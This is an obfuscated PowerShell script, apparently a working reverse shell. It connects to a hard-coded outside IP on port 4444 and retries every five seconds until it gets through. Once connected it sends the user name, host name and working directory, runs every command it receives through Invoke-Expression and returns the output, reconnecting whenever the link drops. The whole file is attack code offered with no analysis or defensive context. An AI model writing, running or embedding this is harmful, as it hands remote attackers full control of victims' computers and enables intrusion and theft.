class RxVtoufPbEaBFkKsGCElQFxw {
    
    [string]$iXzdwVjpgOYVdIN = "93.49.240.195"
    [int]$eDUbNrZPVikGeJFWFLNjBqQO = 4444

    $mSpheewKIbTxbjY
    $oMVADXVnwEWBbWmCGAgg
    $UEEFOrVbFTwCvm
    $oVTdbMwYX
    $SfKaIlpTUoeXrrESywosjPi
    $PYCKoyGnvwCNzueHrpXa
    [int]$TkaqQrISupFAvPtwB = 50*1024

    wOVOoC() {
        $this.oMVADXVnwEWBbWmCGAgg = $false
        while ($true) {
            try {
                $this.oMVADXVnwEWBbWmCGAgg = New-Object Net.Sockets.TcpClient($this.iXzdwVjpgOYVdIN, $this.eDUbNrZPVikGeJFWFLNjBqQO)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.gQLqPjJdAHyWBbNR()
    }

    gQLqPjJdAHyWBbNR() {
        $this.mSpheewKIbTxbjY = $this.oMVADXVnwEWBbWmCGAgg.GetStream()
        $this.oVTdbMwYX = New-Object Byte[] $this.TkaqQrISupFAvPtwB
        $this.PYCKoyGnvwCNzueHrpXa = New-Object Text.UTF8Encoding
        $this.UEEFOrVbFTwCvm = New-Object IO.StreamWriter($this.mSpheewKIbTxbjY, [Text.Encoding]::UTF8, $this.TkaqQrISupFAvPtwB)
        $this.SfKaIlpTUoeXrrESywosjPi = New-Object System.IO.StreamReader($this.mSpheewKIbTxbjY)
        $this.UEEFOrVbFTwCvm.AutoFlush = $true
    }

    uBAgM() {
        $this.wOVOoC()
        $this.qQriz()
    }

    FzpPwXaFLZk($NABxXImXhjrWKNXLVhqiPe) {
        try {
            [byte[]]$kuWfEPCZ = [text.Encoding]::Ascii.GetBytes($NABxXImXhjrWKNXLVhqiPe)
            $this.UEEFOrVbFTwCvm.Write($kuWfEPCZ, 0, $kuWfEPCZ.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.uBAgM()
        }
    }

    [string] HajsIEHYZgilPEDP() {
        try {
            $iXsoFx = $this.mSpheewKIbTxbjY.Read($this.oVTdbMwYX, 0, $this.TkaqQrISupFAvPtwB)    
            $XvmjnKoWRFinujMozpUXDlP = ($this.PYCKoyGnvwCNzueHrpXa.GetString($this.oVTdbMwYX, 0, $iXsoFx))
            return $XvmjnKoWRFinujMozpUXDlP
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.uBAgM()
            return ""
        }
    }

    [string] NcmqgB($GtNDoPwP) {
        Write-Host $GtNDoPwP
        try { 
            $KpljQIfPefpBwjy = Invoke-Expression $GtNDoPwP | Out-String
        }
        catch {
            $nqzHAv = $_.Exception
            $MgrHwTW = $_.Message
            $KpljQIfPefpBwjy = "`n$_`n"
        }
        return $KpljQIfPefpBwjy
    }

    [string] YVExRUIWVE() {
        $tAQSpRqGnuDrmkqBv = [Environment]::UserName
        $WIppG = [System.Net.Dns]::GetHostName()
        $JSfhXAKaajCANRfVSJGCpHvs = Get-Location
        return "$tAQSpRqGnuDrmkqBv@$WIppG [$JSfhXAKaajCANRfVSJGCpHvs]~$ "
    }

    qQriz() {
        while ($this.oMVADXVnwEWBbWmCGAgg.Connected) {
            $this.FzpPwXaFLZk($this.YVExRUIWVE())         
            $XvmjnKoWRFinujMozpUXDlP = $this.HajsIEHYZgilPEDP()
            $KpljQIfPefpBwjy = "`n"
            if ([string]::IsNullOrEmpty($XvmjnKoWRFinujMozpUXDlP)) {
                continue
            }
            $KpljQIfPefpBwjy = $this.NcmqgB($XvmjnKoWRFinujMozpUXDlP)
            $this.FzpPwXaFLZk($KpljQIfPefpBwjy + "`n")
            $this.mSpheewKIbTxbjY.Flush()
        }
        $this.oMVADXVnwEWBbWmCGAgg.Close()
        $this.uBAgM()
    } 
}

$duilFqiX = [RxVtoufPbEaBFkKsGCElQFxw]::new()
$duilFqiX.uBAgM()
